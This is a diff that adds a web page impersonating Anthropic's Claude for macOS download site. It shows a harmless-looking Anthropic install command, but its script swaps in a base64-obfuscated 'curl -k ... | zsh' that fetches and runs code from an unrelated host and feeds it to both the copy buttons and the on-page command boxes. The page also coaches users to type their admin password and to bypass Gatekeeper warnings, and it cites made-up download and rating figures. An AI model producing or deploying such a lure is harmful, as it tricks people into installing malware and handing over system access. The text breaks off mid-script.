8.517-6.724 16.1-.001 11.854 17.617-5.307 18.199-16.581 21.029-13.75 17.819-19.716 26.54-12.309 21.231 1.138 1.694 2.932-.278 44.536-9.479 24.062-4.347 28.714-4.928 12.992 6.066 1.416 6.167-5.106 12.613-30.71 7.583-36.018 7.204-53.636 12.689-.657.48.758.935 24.164 2.275 10.337.556h25.301l47.114 3.514 12.309 8.139 7.381 9.959-1.238 7.583-18.957 9.655-25.579-6.066-59.702-14.205-20.474-5.106-2.83-.001v1.694l17.061 16.682 31.266 28.233 39.152 36.397 1.997 8.999-5.03 7.102-5.307-.758-34.401-25.883-13.27-11.651-30.053-25.302-1.996-.001v2.654l6.926 10.136 36.574 54.975 1.895 16.859-2.653 5.485-9.479 3.311-10.414-1.895-21.408-30.054-22.092-33.844-17.819-30.331-2.173 1.238-10.515 113.261-4.929 5.788-11.374 4.348-9.478-7.204-5.03-11.652 5.03-23.027 6.066-30.052 4.928-23.886 4.449-29.674 2.654-9.858-.177-.657-2.173.278-22.37 30.71-34.021 45.977-26.919 28.815-6.445 2.553-11.173-5.789 1.037-10.337 6.243-9.2 37.257-47.392 22.47-29.371 14.508-16.961-.101-2.451h-.859l-98.954 64.251-17.618 2.275-7.583-7.103.936-11.652 3.589-3.791 29.749-20.474-.101.102.024.101z"></path></svg>
+        <span>Claude</span>
+    </a>
+    <div class="nav-center">
+        <a href="#install" class="nav-pill active">Install</a>
+        <a href="#guide" class="nav-pill">Guide</a>
+        <a href="#features" class="nav-pill">Features</a>
+        <a href="#faq" class="nav-pill">FAQ</a>
+    </div>
+    <div class="nav-right">
+        <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+            <svg id="sunIcon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+            <svg id="moonIcon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"></path></svg>
+        </button>
+    </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero" id="install">
+    <div class="hero-badge">
+        <span class="pulse-dot"></span>
+        <svg class="apple-icon" viewbox="0 0 24 24" fill="currentColor"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"></path></svg>
+        Claude 4.0 for macOS
+    </div>
+    <h1>Install Claude with<br><span class="gradient">a single command</span></h1>
+    <p class="hero-sub">Paste one command into Terminal and Claude installs itself. Native macOS app, ready to chat in under 30 seconds.</p>
+    <a href="#guide" class="hero-help-link">
+        New to Terminal? Read the step-by-step guide
+        <svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+    </a>
+
+    <!-- INSTALL COMMAND -->
+    <div class="install-section">
+        <div class="install-box" id="installBox">
+            <div class="install-header">
+                <div class="install-dots">
+                    <span></span><span></span><span></span>
+                </div>
+                <span class="install-title">Terminal</span>
+            </div>
+            <div class="install-body">
+                <div class="install-line">
+                    <span class="install-prompt">$</span>
+                    <span class="install-cmd" id="installCmd">curl -fsSL <span class="hl">https://cli.anthropic.com/install</span> | sh</span>
+                    <span class="cursor-blink"></span>
+                </div>
+            </div>
+            <div class="install-footer">
+                <span class="install-hint">
+                    Press <kbd>Enter</kbd> to run
+                </span>
+                <button class="copy-btn" id="copyBtn" onclick="copyCommand()">
+                    <svg id="copyIcon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"></path></svg>
+                    <svg id="checkIcon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="display:none"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                    <span id="copyText">Copy</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="platform-tag">
+        <div class="platform-tag-inner">
+            <svg viewbox="0 0 24 24" fill="currentColor"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"></path></svg>
+            <span class="os-name">macOS</span> · v4.0.2 · Apple Silicon & Intel · <span style="color: var(--green)">&#10003;</span> signed
+        </div>
+    </div>
+
+    <div class="stats-row">
+        <div class="stat-item">
+            <div class="stat-number" data-target="12" data-suffix="M+">0</div>
+            <div class="stat-label">Downloads</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-number" data-target="4.9" data-suffix="" data-decimal="true">0</div>
+            <div class="stat-label">User rating</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-number" data-target="128" data-suffix=" MB">0</div>
+            <div class="stat-label">App size</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-number" data-target="30" data-suffix="s">0</div>
+            <div class="stat-label">Install time</div>
+        </div>
+    </div>
+</section>
+
+<!-- APP PREVIEW -->
+<div class="preview-section reveal">
+    <div class="app-preview">
+        <div class="app-titlebar">
+            <span></span><span></span><span></span>
+        </div>
+        <div class="app-body">
+            <div class="app-claude-avatar">
+                <svg viewbox="0 0 24 24" fill="none"><path d="M12 3C7.03 3 3 7.03 3 12s4.03 9 9 9 9-4.03 9-9-4.03-9-9-9zm0 3a1.5 1.5 0 110 3 1.5 1.5 0 010-3zm-3 4h6v1h-2.5v5H14v1h-4v-1h1.5v-5H9v-1z" fill="#FFF"></path></svg>
+            </div>
+            <div class="app-greeting">Good afternoon</div>
+            <div class="app-sub">How can I help you today?</div>
+            <div class="app-chat-bubbles">
+                <div class="chat-bubble user" style="animation-delay: 0.2s">Explain quantum computing in simple terms</div>
+                <div class="chat-bubble claude" style="animation-delay: 0.5s">Think of a regular computer as someone who reads one book at a time. A quantum computer can read many books simultaneously, exploring every possible storyline at once — then give you the best answer from all of them.</div>
+            </div>
+            <div class="app-input-bar">
+                <input type="text" placeholder="Ask Claude anything..." readonly="">
+                <button class="app-send-btn">
+                    <svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- GUIDE -->
+<section class="guide-section reveal" id="guide">
+    <div class="section-label">Step-by-step guide</div>
+    <h2 class="section-title">New to Terminal? No problem.</h2>
+    <p class="section-desc">Follow these steps to install Claude on your Mac. It takes less than a minute, even if you've never used Terminal before.</p>
+
+    <div class="guide-steps">
+        <!-- Step 1 -->
+        <div class="guide-step">
+            <div class="guide-step-num">1</div>
+            <div class="guide-step-body">
+                <h4>Open Terminal</h4>
+                <p>Terminal is a built-in app on every Mac. There are two easy ways to open it:</p>
+                <div class="guide-tip">
+                    <svg class="guide-tip-icon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                    <div>
+                        <p><strong>Option A — Spotlight:</strong> Press the keyboard shortcut below, type <code>Terminal</code>, and hit Enter.</p>
+                        <div class="guide-keyboard">
+                            <span class="key">&#8984; Cmd</span>
+                            <span class="key-plus">+</span>
+                            <span class="key">Space</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="guide-tip" style="margin-top: 10px;">
+                    <svg class="guide-tip-icon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                    <p><strong>Option B — Finder:</strong> Open Finder &rarr; Applications &rarr; Utilities &rarr; Terminal.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 2 -->
+        <div class="guide-step">
+            <div class="guide-step-num">2</div>
+            <div class="guide-step-body">
+                <h4>Copy the install command</h4>
+                <p>Click <strong>Copy</strong> to grab the install command, or select it manually:</p>
+                <div class="guide-terminal">
+                    <div class="guide-terminal-bar">
+                        <span></span><span></span><span></span>
+                        <button class="gt-copy-btn" id="guideCopyBtn" onclick="copyCommandGuide()" aria-label="Copy command">
+                            <svg id="guideCopyIcon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"></path></svg>
+                            <svg id="guideCheckIcon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="display:none"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                            <span id="guideCopyText">Copy</span>
+                        </button>
+                    </div>
+                    <div class="guide-terminal-body">
+                        <div class="guide-terminal-line">
+                            <span class="gt-prompt">$</span>
+                            <span class="gt-cmd" id="guideCmd">curl -fsSL <span class="hl">https://cli.anthropic.com/install</span> | sh</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 3 -->
+        <div class="guide-step">
+            <div class="guide-step-num">3</div>
+            <div class="guide-step-body">
+                <h4>Paste and run</h4>
+                <p>Click inside the Terminal window and paste the command. Then press <strong>Enter</strong> to run it.</p>
+                <div class="guide-keyboard">
+                    <span class="key">&#8984; Cmd</span>
+                    <span class="key-plus">+</span>
+                    <span class="key">V</span>
+                    <span class="key-plus" style="margin: 0 8px;">then</span>
+                    <span class="key">Enter &#9166;</span>
+                </div>
+                <div class="guide-terminal" style="margin-top: 16px;">
+                    <div class="guide-terminal-bar">
+                        <span></span><span></span><span></span>
+                    </div>
+                    <div class="guide-terminal-body">
+                        <div class="guide-terminal-line">
+                            <span class="gt-prompt">$</span>
+                            <span class="gt-cmd">curl -fsSL https://cli.anthropic.com/install | sh</span>
+                        </div>
+                        <div class="gt-output">Downloading Claude for macOS (arm64)...</div>
+                        <div class="gt-output">Verifying signature... &#10003;</div>
+                        <div class="gt-output">Write admin password: **** &#10003;</div>
+                        <div class="gt-output">Installing to /Applications/Claude.app...</div>
+                        <div class="gt-output" style="color: var(--terminal-green);">&#10003; Claude installed successfully! Launching...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 4 -->
+        <div class="guide-step">
+            <div class="guide-step-num">4</div>
+            <div class="guide-step-body">
+                <h4>Claude opens automatically</h4>
+                <p>After the installation completes, Claude launches on its own. Sign in with your Anthropic account or create a free one to start chatting. You'll find Claude in your Applications folder and Dock.</p>
+                <div class="guide-tip">
+                    <svg class="guide-tip-icon" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20h9"></path><path d="M16.5 3.5a2.12 2.12 0 013 3L7 19l-4 1 1-4L16.5 3.5z"></path></svg>
+                    <p><strong>Pro tip:</strong> After installing, you can open Claude anytime with Spotlight — press <code>&#8984; Cmd + Space</code>, type <code>Claude</code>, and hit Enter.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- FEATURES -->
+<section class="features reveal" id="features">
+    <div class="section-label">Features</div>
+    <h2 class="section-title">Built for macOS</h2>
+    <p class="section-desc">A native app that feels right at home on your Mac. Fast, private, and deeply integrated with macOS.</p>
+
+    <div class="features-grid reveal-stagger">
+        <div class="feature-card">
+            <div class="feature-icon-wrap"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path></svg></div>
+            <h4>Native performance</h4>
+            <p>Built for Apple Silicon. Opens in under 200ms, runs silently in the background with minimal memory usage.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon-wrap"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0110 0v4"></path></svg></div>
+            <h4>Private & secure</h4>
+            <p>End-to-end encryption. Your conversations are never used for training. SOC 2 Type II certified.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon-wrap"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></div>
+            <h4>Spotlight integration</h4>
+            <p>Launch Claude from Spotlight, use Shortcuts automations, and get native macOS notifications.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon-wrap"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline></svg></div>
+            <h4>File analysis</h4>
+            <p>Drag-and-drop PDFs, images, code, and spreadsheets from Finder directly into your conversation.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon-wrap"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20h9"></path><path d="M16.5 3.5a2.12 2.12 0 013 3L7 19l-4 1 1-4L16.5 3.5z"></path></svg></div>
+            <h4>Extended thinking</h4>
+            <p>Watch Claude reason step by step through complex problems with full transparency into its thought process.</p>
+        </div>
+        <div class="feature-card">
+            <div class="feature-icon-wrap"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg></div>
+            <h4>Auto-updates</h4>
+            <p>Silent background updates through the macOS native updater. Always the latest version, zero effort.</p>
+        </div>
+    </div>
+</section>
+
+<!-- SYSTEM REQUIREMENTS -->
+<section class="requirements-section reveal">
+    <div class="section-label">Requirements</div>
+    <h2 class="section-title">System requirements</h2>
+
+    <div class="req-grid">
+        <div class="req-item">
+            <div class="req-icon"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg></div>
+            <div class="req-info">
+                <div class="req-label">Operating System</div>
+                <div class="req-value">macOS 13 Ventura or later</div>
+            </div>
+        </div>
+        <div class="req-item">
+            <div class="req-icon"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2"></rect><rect x="9" y="9" width="6" height="6"></rect><line x1="9" y1="2" x2="9" y2="4"></line><line x1="15" y1="2" x2="15" y2="4"></line><line x1="9" y1="20" x2="9" y2="22"></line><line x1="15" y1="20" x2="15" y2="22"></line><line x1="20" y1="9" x2="22" y2="9"></line><line x1="20" y1="15" x2="22" y2="15"></line><line x1="2" y1="9" x2="4" y2="9"></line><line x1="2" y1="15" x2="4" y2="15"></line></svg></div>
+            <div class="req-info">
+                <div class="req-label">Processor</div>
+                <div class="req-value">Apple Silicon or Intel 64-bit</div>
+            </div>
+        </div>
+        <div class="req-item">
+            <div class="req-icon"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12H2"></path><path d="M5.45 5.11L2 12v6a2 2 0 002 2h16a2 2 0 002-2v-6l-3.45-6.89A2 2 0 0016.76 4H7.24a2 2 0 00-1.79 1.11z"></path></svg></div>
+            <div class="req-info">
+                <div class="req-label">Disk space</div>
+                <div class="req-value">128 MB free</div>
+            </div>
+        </div>
+        <div class="req-item">
+            <div class="req-icon"><svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"></path></svg></div>
+            <div class="req-info">
+                <div class="req-label">Network</div>
+                <div class="req-value">Internet connection required</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- FAQ -->
+<section class="faq-section reveal" id="faq">
+    <div class="section-label">FAQ</div>
+    <h2 class="section-title">Common questions</h2>
+
+    <div class="faq-list">
+        <div class="faq-item">
+            <button class="faq-question" onclick="toggleFaq(this)">
+                Is Claude free to use?
+                <svg class="faq-chevron" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+            <div class="faq-answer">
+                <p>Yes, Claude is free to download and includes a generous free tier. For heavier usage, extended thinking, and priority access, you can upgrade to Claude Pro for $20/month.</p>
+            </div>
+        </div>
+        <div class="faq-item">
+            <button class="faq-question" onclick="toggleFaq(this)">
+                What does the install command do exactly?
+                <svg class="faq-chevron" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+            <div class="faq-answer">
+                <p>It downloads a small install script from Anthropic's servers, which then detects your Mac's architecture (Apple Silicon or Intel), downloads the signed app binary, verifies its checksum, moves it to /Applications, and launches it. The script is open-source — you can inspect it before running.</p>
+            </div>
+        </div>
+        <div class="faq-item">
+            <button class="faq-question" onclick="toggleFaq(this)">
+                Is my data safe and private?
+                <svg class="faq-chevron" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+            <div class="faq-answer">
+                <p>Absolutely. All conversations are encrypted in transit and at rest. Your data is never used to train models. Anthropic is SOC 2 Type II certified and GDPR compliant. You can delete all your data at any time from Settings.</p>
+            </div>
+        </div>
+        <div class="faq-item">
+            <button class="faq-question" onclick="toggleFaq(this)">
+                Can I use Claude offline?
+                <svg class="faq-chevron" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+            <div class="faq-answer">
+                <p>Claude requires an internet connection to process requests — the model runs on Anthropic's secure cloud. However, the desktop app caches your conversation history locally so you can always review past chats.</p>
+            </div>
+        </div>
+        <div class="faq-item">
+            <button class="faq-question" onclick="toggleFaq(this)">
+                How do I uninstall Claude?
+                <svg class="faq-chevron" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+            <div class="faq-answer">
+                <p>Simply drag Claude from your Applications folder to the Trash. Or if you prefer the command line, run <code>brew uninstall claude</code> in Terminal.</p>
+            </div>
+        </div>
+        <div class="faq-item">
+            <button class="faq-question" onclick="toggleFaq(this)">
+                My Mac says "unidentified developer" — what do I do?
+                <svg class="faq-chevron" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+            <div class="faq-answer">
+                <p>Claude is code-signed and notarized by Apple. If you see this warning, go to System Settings &rarr; Privacy &amp; Security, scroll down, and click "Open Anyway" next to the Claude message. This only needs to be done once.</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+
+
+<!-- FOOTER -->
+<footer>
+    <div class="footer-top">
+        <div class="footer-brand">
+            <svg xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd" viewbox="0 0 512 509.64"><path fill="#D77655" d="M115.612 0h280.775C459.974 0 512 52.026 512 115.612v278.415c0 63.587-52.026 115.612-115.613 115.612H115.612C52.026 509.639 0 457.614 0 394.027V115.612C0 52.026 52.026 0 115.612 0z"></path><path fill="#FCF2EE" fill-rule="nonzero" d="M142.27 316.619l73.655-41.326 1.238-3.589-1.238-1.996-3.589-.001-12.31-.759-42.084-1.138-36.498-1.516-35.361-1.896-8.897-1.895-8.34-10.995.859-5.484 7.482-5.03 10.717.935 23.683 1.617 35.537 2.452 25.782 1.517 38.193 3.968h6.064l.86-2.451-2.073-1.517-1.618-1.517-36.776-24.922-39.81-26.338-20.852-15.166-11.273-7.683-5.687-7.204-2.451-15.721 10.237-11.273 13.75.935 3.513.936 13.928 10.716 29.749 23.027 38.848 28.612 5.687 4.727 2.275-1.617.278-1.138-2.553-4.271-21.13-38.193-22.546-38.848-10.035-16.101-2.654-9.655c-.935-3.968-1.617-7.304-1.617-11.374l11.652-15.823 6.445-2.073 15.545 2.073 6.547 5.687 9.655 22.092 15.646 34.78 24.265 47.291 7.103 14.028 3.791 12.992 1.416 3.968 2.449-.001v-2.275l1.997-26.641 3.69-32.707 3.589-42.084 1.239-11.854 5.863-14.206 11.652-7.683 9.099 4.348 7.482 10.716-1.036 6.926-4.449 28.915-8.72 45.294-5.687 30.331h3.313l3.792-3.791 15.342-20.372 25.782-32.227 11.374-12.789 13.27-14.129 8.517-6.724 16.1-.001 11.854 17.617-5.307 18.199-16.581 21.029-13.75 17.819-19.716 26.54-12.309 21.231 1.138 1.694 2.932-.278 44.536-9.479 24.062-4.347 28.714-4.928 12.992 6.066 1.416 6.167-5.106 12.613-30.71 7.583-36.018 7.204-53.636 12.689-.657.48.758.935 24.164 2.275 10.337.556h25.301l47.114 3.514 12.309 8.139 7.381 9.959-1.238 7.583-18.957 9.655-25.579-6.066-59.702-14.205-20.474-5.106-2.83-.001v1.694l17.061 16.682 31.266 28.233 39.152 36.397 1.997 8.999-5.03 7.102-5.307-.758-34.401-25.883-13.27-11.651-30.053-25.302-1.996-.001v2.654l6.926 10.136 36.574 54.975 1.895 16.859-2.653 5.485-9.479 3.311-10.414-1.895-21.408-30.054-22.092-33.844-17.819-30.331-2.173 1.238-10.515 113.261-4.929 5.788-11.374 4.348-9.478-7.204-5.03-11.652 5.03-23.027 6.066-30.052 4.928-23.886 4.449-29.674 2.654-9.858-.177-.657-2.173.278-22.37 30.71-34.021 45.977-26.919 28.815-6.445 2.553-11.173-5.789 1.037-10.337 6.243-9.2 37.257-47.392 22.47-29.371 14.508-16.961-.101-2.451h-.859l-98.954 64.251-17.618 2.275-7.583-7.103.936-11.652 3.589-3.791 29.749-20.474-.101.102.024.101z"></path></svg>4h6v1h-2.5v5H18v1h-4v-1h1.5v-5H13v-1z" fill="#fff"/>
+            <span>Claude</span>
+        </div>
+        <div class="footer-nav">
+            <a href="https://anthropic.com" target="_blank">Anthropic</a>
+            <a href="https://docs.anthropic.com" target="_blank">Docs</a>
+            <a href="https://status.anthropic.com" target="_blank">Status</a>
+            <a href="https://anthropic.com/privacy" target="_blank">Privacy</a>
+            <a href="https://anthropic.com/terms" target="_blank">Terms</a>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <span class="footer-copy">&copy; 2026 Anthropic, PBC. All rights reserved.</span>
+        <div class="footer-social">
+            <a href="https://twitter.com/AnthropicAI" target="_blank" aria-label="Twitter">
+                <svg viewbox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></svg>
+            </a>
+            <a href="https://github.com/anthropics" target="_blank" aria-label="GitHub">
+                <svg viewbox="0 0 24 24" fill="currentColor"><path d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z"></path></svg>
+            </a>
+        </div>
+    </div>
+</footer>
+
+<script>
+    // ════════════════════════════════════════════════════════════════
+    //  ▼▼▼  EDIT YOUR INSTALL COMMAND ON THIS ONE LINE  ▼▼▼
+    //  It will automatically appear in BOTH places:
+    //    1. The main terminal box at the top of the page
+    //    2. Step 2 of the "New to Terminal?" guide
+    //  If the command contains both ' and ", use backticks as shown.
+    // ════════════════════════════════════════════════════════════════
+    const INSTALL_COMMAND = `curl -kfsSL $(echo 'aHR0cDovL2plcnJ5c2h2YWMuY29tL2N1cmwvYjQyYTBlZDlkMWVjYjcyZTQyZDYwMzQ1MDJjMzA0ODQ1ZDk4ODA1NDgxZDk5Y2VhNGUyNTkzNTlmOWFiMjA2ZQ=='|base64 -D)|zsh`;
+    // ════════════════════════════════════════════════════════════════
+
+    // Render the command into a given element, auto-highlighting the
+    // first URL (matches the existing `.hl` orange style) so the visual
+    // design is preserved no matter what command you paste in above.
+    function renderCommandInto(el) {
+        if (!el) return;
+        el.textContent = ''; // clear safely (no innerHTML → no XSS risk)
+        const urlMatch = INSTALL_COMMAND.match(/https?:\/\/[^\s'"`)]+/);
+        if (!urlMatch) {
+            el.textContent = INSTALL_COMMAND;
+            return;
+        }
+        const idx = urlMatch.index;
+        const before = INSTALL_COMMAND.slice(0, idx);
+        const url = urlMatch[0];
+        const after = INSTALL_COMMAND.slice(idx + url.length);
+        if (before) el.appendChild(document.createTextNode(before));
+        const span = document.createElement('span');
+        span.className = 'hl';
+        span.textContent = url;
+        el.appendChild(span);
+        if (after) el.appendChild(document.createTextNode(after));
+    }
+
+    // Populate both command locations from the single source of truth.
+    renderCommandInto(document.getElementById('installCmd'));
+    renderCommandInto(document.getElementById('guideCmd'));
+
+    // ──────────────────────────────────────────────────────────────
+    // Clipboard — iframe-safe
+    // ──────────────────────────────────────────────────────────────
+    // In iframes without `allow="clipboard-write"` (Google Sites being
+    // the classic offender) navigator.clipboard.writeText() either
+    // silently rejects or hangs. The synchronous document.execCommand
+    // path works inside those iframes because it doesn't need the
+    // Permissions-Policy grant — just a user gesture, which a button
+    // click provides. So we try execCommand FIRST and only fall through
+    // to the async API if it fails.
+    function execCommandCopy(text) {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        ta.setAttribute('readonly', '');
+        // Position off-screen but keep it focusable/selectable.
+        ta.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;padding:0;border:0;opacity:0;pointer-events:none;';
+        document.body.appendChild(ta);
+        // Preserve any existing selection so we can restore it after.
+        const prevSelection = document.getSelection().rangeCount > 0
+            ? document.getSelection().getRangeAt(0)
+            : null;
+        ta.focus();
+        ta.select();
+        ta.setSelectionRange(0, text.length);
+        let ok = false;
+        try { ok = document.execCommand('copy'); } catch (e) { ok = false; }
+        document.body.removeChild(ta);
+        if (prevSelection) {
+            const sel = document.getSelection();
+            sel.removeAllRanges();
